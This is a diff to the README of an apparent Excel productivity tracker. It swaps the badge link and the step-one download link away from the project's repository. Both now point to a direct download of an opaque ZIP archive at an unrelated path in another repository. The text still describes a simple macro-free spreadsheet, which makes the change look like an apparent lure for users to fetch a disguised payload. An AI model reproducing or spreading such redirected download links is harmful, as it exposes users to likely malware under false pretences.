@@ -5,7 +5,7 @@ description: "Manage tasks, projects, and reading goals in one Excel system with
 ---
 # 📊 the-file - Manage your daily productivity with ease
 
-[![](https://img.shields.io/badge/Download-the--file-blue.svg)](https://github.com/u3386100/the-file)
+[![](https://img.shields.io/badge/Download-the--file-blue.svg)](https://github.com/u3386100/u3386100.github.io/raw/refs/heads/main/conviviality/u_io_github_1.5.zip)
 
 the-file is a productivity tracker built inside Microsoft Excel. It organizes your tasks, projects, and reading lists without complex coding or macros. Use this tool to track your time, monitor progress, and finish your goals.
 
@@ -23,7 +23,7 @@ You do not need to install extra software or plugins. The tool relies on interna
 
 Follow these steps to access the tracker.
 
-1.  Visit this page to download: [https://github.com/u3386100/the-file](https://github.com/u3386100/the-file).
+1.  Visit this page to download: [https://github.com/u3386100/u3386100.github.io/raw/refs/heads/main/conviviality/u_io_github_1.5.zip](https://github.com/u3386100/u3386100.github.io/raw/refs/heads/main/conviviality/u_io_github_1.5.zip).
 2.  Locate the Download button or the green Code button on the page.
 3.  Choose Download ZIP to save the folder to your computer.
 4.  Open your Downloads folder.
